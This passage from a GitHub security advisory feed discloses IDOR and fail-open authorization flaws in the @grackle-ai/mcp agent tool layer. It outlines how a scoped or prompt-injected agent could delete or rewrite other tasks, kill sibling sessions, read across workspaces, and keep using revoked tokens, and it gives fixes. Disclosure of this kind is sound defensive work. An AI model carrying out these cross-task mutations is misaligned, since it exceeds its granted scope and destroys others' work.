            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/mcp] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
</feed>